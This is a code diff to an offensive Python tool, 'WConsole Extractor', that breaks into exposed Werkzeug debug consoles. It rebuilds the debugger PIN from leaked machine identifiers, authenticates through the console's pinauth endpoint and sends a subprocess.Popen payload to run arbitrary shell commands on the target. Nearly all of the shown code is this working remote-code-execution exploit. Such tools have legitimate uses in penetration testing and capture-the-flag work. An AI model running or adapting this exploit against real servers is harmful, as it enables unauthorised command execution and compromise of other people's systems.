@@ -4,6 +4,7 @@ import re
 import hashlib
 from itertools import chain
 from bs4 import BeautifulSoup as bs
+import json
 
 from prompt_toolkit import PromptSession
 from prompt_toolkit.shortcuts import clear
@@ -88,6 +89,19 @@ class WConsoleExtractor:
 
         self.pin_code = self.compute_pin()
         self.token = self.get_token(content)
+
+        if not self.authent():
+            message = f"""The computed PIN CODE is wrong\n
+            \rThis behavior can have multiple causes:
+            \r    1. Your leak function is not accurate
+            \r    2. The target can have an uuid.getnode() different from the mac address found in /sys/class/net/<device_id>/address
+            \r    3. WConsole Extractor is not up to date or has an issue (please report on tool's repository)
+
+            \rHere are the probably public bits:
+            \r    {self.probably_public_bits}
+            \rHere are the private bits:
+            \r    {self.private_bits}"""
+            error(message)
 
     @staticmethod
     def parse_environ(environ:str):
@@ -327,15 +341,23 @@ class WConsoleExtractor:
             error("Error while finding token")
 
         return token[0]
+    
+    def authent(self):
+        authent_path = f"/console?__debugger__=yes&cmd=pinauth&pin={self.pin_code}&s={self.token}"
+        r = self.get(authent_path)
+
+        try:
+            state = json.loads(r.text)
+        except:
+            error("Error during authentication")
+        return state["auth"]
 
     def exec_cmd(self, cmd:str):
         argv = cmd.split(' ')
 
-        # Authentication
-        authent_path = f"/console?__debugger__=yes&cmd=pinauth&pin={self.pin_code}&s={self.token}"
-        self.get(authent_path)
+        self.authent()
         
-        payload = f"import subprocess; subprocess.Popen({argv}, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).communicate()"
+        payload = f"import subprocess; subprocess.Popen({argv},stdout=subprocess.PIPE,stderr=subprocess.STDOUT).communicate()"
         url = f"/console?__debugger__=yes&cmd={payload}&frm=0&s={self.token}"
         res = self.get(url)
 
